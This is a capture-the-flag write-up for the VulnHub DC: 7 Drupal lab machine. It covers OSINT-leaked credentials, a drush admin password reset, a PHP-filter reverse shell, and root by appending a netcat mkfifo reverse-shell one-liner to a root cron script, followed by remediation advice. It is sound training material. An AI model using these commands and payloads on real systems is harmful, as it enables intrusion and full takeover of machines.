# DC: 7 — Writeup

| | |
|-|-|
| **Target IP** | 192.168.1.101 (host-only) |
| **Difficulty** | Medium |
| **OS** | Linux (Drupal) |
| **Root Flag** | `/root/thefinalflag.txt` |
| **Source** | [VulnHub](https://www.vulnhub.com/entry/dc-7,356/) |

## Attack Summary

nmap → Drupal hint ("@DC7User") → Twitter → GitHub config.php (dc7user:MdR3xOgB7#dW) → SSH → mailbox hint → drush admin password reset → Drupal PHP module → reverse shell (www-data) → writable `/opt/scripts/backup.sh` (run by cron as root) → root

## Methodology

1. Network scan — Drupal on port 80
2. OSINT — Twitter handle → GitHub → credentials
3. SSH login as dc7user
4. Drupal privilege escalation via drush
5. PHP code execution via Drupal PHP module
6. Cron script injection for root

---

## Step 1: Network Scan

```bash
nmap -A 192.168.1.101
```

Port 80 runs Drupal. The welcome page displays **@DC7User** at the bottom — a hint to search outside the box.

![Nmap / Drupal](images/01-nmap.png)

---

## Step 2: OSINT — Twitter → GitHub → Credentials

Search Twitter for `@DC7User`. The account links to a GitHub repository containing a PHP project (`staffdb`). Inspect `config.php`:

```
username: dc7user
password: MdR3xOgB7#dW
```

![GitHub credentials](images/02-github-creds.png)

---

## Step 3: SSH Login

```bash
ssh dc7user@192.168.1.101
# password: MdR3xOgB7#dW
```

A mail message in `/var/mail/dc7user` references `/opt/scripts/backup.sh`. That script uses the `drush` (Drupal shell) CLI — note it runs as root via cron.

---

## Step 4: Drupal Admin Password Reset via drush

```bash
cd /var/www/html
drush user-password admin --password=raj
```

Login at `http://192.168.1.101/user/login` as `admin:raj`.

![drush password reset](images/03-drush.png)

---

## Step 5: Enable PHP Execution in Drupal

1. Download the PHP module: `https://www.drupal.org/project/php`
2. Install via Manage > Extend > Install new module
3. Enable "PHP filter" under text formats
4. Create a Basic Page, paste the pentestmonkey PHP reverse shell, set format to **PHP code**, publish

```bash
# Attacker: start listener
nc -nvlp 4444
```

Preview the page to trigger the shell. Shell lands as **www-data**.

![PHP reverse shell](images/04-php-shell.png)

---

## Step 6: Cron Backup Script Injection → Root

`www-data` has write access to `/opt/scripts/backup.sh`, which cron executes as root.

```bash
# Generate reverse shell payload
msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.106 lport=8888 R
```

Append the mkfifo payload to backup.sh:

```bash
echo "mkfifo /tmp/ulgg; nc 192.168.1.106 8888 0</tmp/ulgg | /bin/sh >/tmp/ulgg 2>&1; rm /tmp/ulgg" >> /opt/scripts/backup.sh
```

Start a second listener:

```bash
nc -nvlp 8888
```

Wait for cron to run backup.sh. Root shell arrives.

![Root shell](images/05-root.png)

```bash
cat /root/thefinalflag.txt
```

---

## Lessons Learned

1. **OSINT beyond the machine** — hints embedded in web pages (Twitter handles) can lead directly to credentials
2. **drush CLI** gives unrestricted Drupal database access including password resets — restrict filesystem permissions
3. **Drupal PHP filter module** enables arbitrary PHP execution in page content — never enable in production
4. **Cron scripts owned by www-data** are a root escalation path — cron scripts must be root-owned, not world-writable

## Remediation

| Vulnerability | Fix |
|---------------|-----|
| Credentials in public GitHub | Use environment variables or secrets management; audit repos |
| drush accessible to SSH users | Restrict drush execution to admin accounts |
| Drupal PHP filter module | Disable the PHP filter module; use Twig templates |
| World-writable cron script | `chmod 700 /opt/scripts/backup.sh; chown root:root /opt/scripts/backup.sh` |
